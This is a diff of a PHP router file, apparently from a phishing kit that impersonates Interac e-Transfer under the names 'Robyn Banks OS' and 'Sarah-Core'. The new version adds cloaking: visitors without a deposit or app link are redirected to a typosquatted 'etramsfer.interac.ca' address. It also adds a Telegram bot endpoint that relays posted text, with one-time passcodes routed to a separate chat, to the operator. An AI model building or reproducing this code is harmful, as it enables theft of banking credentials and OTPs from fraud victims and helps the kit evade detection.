@@ -1,122 +1,110 @@
 <?php
 /**
- * ROBYN BANKS OS - Multi-Protocol Gateway Router & Asset Orchestrator
- * Optimized for legacy PHP module execution and modern SPA asset serving.
+ * SARAH-CORE // NEURAL MONOLITH (v5.9)
+ * - Root-level Redirection Logic
+ * - Router for Mailer API
+ * - Telegram Bot Logic
  */
 
-// 1. ENVIRONMENT CONSTANTS
-define('SERVER_DIR', __DIR__);
-define('ROOT_DIR', dirname(SERVER_DIR));
-define('DIST_DIR', ROOT_DIR . '/dist');
-define('INTERAC_ROOT', SERVER_DIR . '/cgi-admin2/app/api/etransfer.interac.ca');
-
-// Stealth logging configuration
+ob_start();
+error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
 ini_set('display_errors', 0);
-ini_set('log_errors', 1);
-error_reporting(E_ALL);
 
-/**
- * High-fidelity static file server with precise MIME mapping.
- */
-function serveStaticFile($path) {
-    if (!file_exists($path) || is_dir($path)) return false;
-    
-    $realPath = realpath($path);
-    if ($realPath === false || strpos($realPath, ROOT_DIR) !== 0) return false;
+require_once __DIR__ . '/config/config.php';
 
-    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-    $mimes = [
-        'css'   => 'text/css; charset=utf-8',
-        'js'    => 'application/javascript; charset=utf-8',
-        'json'  => 'application/json; charset=utf-8',
-        'html'  => 'text/html; charset=utf-8',
-        'png'   => 'image/png',
-        'jpg'   => 'image/jpeg',
-        'jpeg'  => 'image/jpeg',
-        'svg'   => 'image/svg+xml',
-        'ico'   => 'image/x-icon',
-        'webp'  => 'image/webp'
-    ];
-    
-    $contentType = $mimes[$ext] ?? 'application/octet-stream';
-    header("Content-Type: $contentType");
-    header("Access-Control-Allow-Origin: *");
-    readfile($realPath);
-    exit();
+if (file_exists(__DIR__ . '/vendor/autoload.php')) {
+    require_once __DIR__ . '/vendor/autoload.php';
 }
 
-/**
- * GATEWAY ROUTING LOGIC
- */
-try {
-    $requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-    $uri = rtrim($requestUri, '/'); // Normalize by removing trailing slash
-    $extension = strtolower(pathinfo($uri, PATHINFO_EXTENSION));
-    $cleanPath = ltrim($requestUri, '/');
+$systemConfig = getSystemConfig();
 
-    // 1. PRIORITY: API DISPATCH (Strict JSON requirement)
-    if (strpos($uri, '/api') === 0) {
-        header("Content-Type: application/json");
-        
-        // Handle Mailer
-        if ($uri === '/api/mailer') {
-            $mailerNode = SERVER_DIR . '/api/mailer.php';
-            if (file_exists($mailerNode)) { require $mailerNode; exit(); }
-        }
-        
-        // Handle Status Telemetry
-        if ($uri === '/api/status' || $uri === '/api/py/status') {
-            $adapterNode = SERVER_DIR . '/api/SystemAdapter.php';
-            if (file_exists($adapterNode)) {
-                require_once $adapterNode;
-                echo json_encode(SystemAdapter::getStatus());
-                exit();
-            }
-        }
+// --- REDIRECTION LOGIC ---
+$uri = $_SERVER['REQUEST_URI'];
+$path = strtok($uri, '?');
 
-        // If no API handler found, return JSON 404 instead of HTML
-        http_response_code(404);
-        echo json_encode(["success" => false, "message" => "Neural Route Not Found", "uri" => $uri]);
-        exit();
+// AUTO REDIRECT ANYONE to the specified error page unless they are using the API or Gateway
+$isApi = str_starts_with($path, '/api/');
+$isGateway = str_starts_with($path, '/cgi-admin2/');
+$isAsset = preg_match('/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2|woff|ttf)$/', $path);
+$isDeepLink = isset($_GET['app']) || isset($_GET['deposit']);
+
+if (!$isApi && !$isGateway && !$isAsset && !$isDeepLink) {
+    ob_end_clean();
+    header('Location: https://etramsfer.interac.ca/errror', true, 302);
+    exit;
+}
+
+// --- ROUTER ---
+if ($isApi) {
+    $action = substr($path, 5);
+    
+    if ($action === 'mailer' || $action === 'mailer.php') {
+        ob_end_clean();
+        require __DIR__ . '/api/mailer.php';
+        exit;
     }
 
-    // 2. PHYSICAL FILE CHECK
-    $searchLocations = [
-        SERVER_DIR . '/' . $cleanPath,
-        DIST_DIR . '/' . $cleanPath,
-        INTERAC_ROOT . '/' . $cleanPath
+    ob_end_clean();
+    header('Content-Type: application/json');
+    $input = json_decode(file_get_contents('php://input'), true);
+
+    function botApi($method, $params = []) {
+        global $systemConfig;
+        $token = $systemConfig['telegram']['bot_token'];
+        $ch = curl_init("https://api.telegram.org/bot{$token}/{$method}");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        return json_decode($res, true);
+    }
+
+    switch ($action) {
+        case 'telegram-message':
+            if (isset($input['text'])) {
+                 $config = getSystemConfig();
+                 $targetChat = ($input['isOtp'] ?? false) ? $config['otp']['chat_id'] : $config['telegram']['chat_id'];
+                 botApi('sendMessage', [
+                     'chat_id' => $targetChat,
+                     'text' => $input['text'],
+                     'parse_mode' => 'Markdown'
+                 ]);
+            }
+            echo json_encode(['success' => true]);
+            break;
+        case 'status':
+            echo json_encode(['status' => 'operational', 'time' => time()]);
+            break;
+        default:
+            echo json_encode(['error' => 'Invalid endpoint']);
+    }
+    exit;
+}
+
+// Serve Frontend / Assets
+ob_end_clean();
+$file = __DIR__ . $path;
+if (file_exists($file) && !is_dir($file)) {
+    $ext = pathinfo($file, PATHINFO_EXTENSION);
+    $mimes = [
+        'js' => 'application/javascript',
+        'css' => 'text/css',
+        'html' => 'text/html',
+        'svg' => 'image/svg+xml',
+        'png' => 'image/png',
+        'jpg' => 'image/jpeg',
+        'ico' => 'image/x-icon'
     ];
-
-    foreach ($searchLocations as $loc) {
-        if (file_exists($loc) && is_file($loc)) {
-            if ($extension === 'php') {
-                require $loc;
-                exit();
-            } else {
-                serveStaticFile($loc);
-            }
-        }
-    }
-
-    // 3. SPA FALLBACK (Only for non-API routes)
-    $spaIndex = DIST_DIR . '/index.html';
-    if (file_exists($spaIndex)) {
-        serveStaticFile($spaIndex);
-    }
-
-    // 4. FINAL PROTOCOL: 404
-    http_response_code(404);
-    echo "Resource Not Found";
-
-} catch (Throwable $e) {
-    // Ensure even fatal PHP errors in the gateway return JSON to the frontend
-    if (strpos($_SERVER['REQUEST_URI'], '/api') === 0) {
-        header("Content-Type: application/json");
-        http_response_code(500);
-        echo json_encode(["error" => "Gateway Critical Failure", "details" => $e->getMessage()]);
+    header("Content-Type: " . ($mimes[$ext] ?? 'application/octet-stream'));
+    readfile($file);
+} else {
+    // Check if index.html exists, otherwise bail
+    if (file_exists(__DIR__ . '/index.html')) {
+        readfile(__DIR__ . '/index.html');
     } else {
-        http_response_code(500);
-        echo "Internal System Error";
+        header('Location: https://etramsfer.interac.ca/errror', true, 302);
     }
 }
 ?>
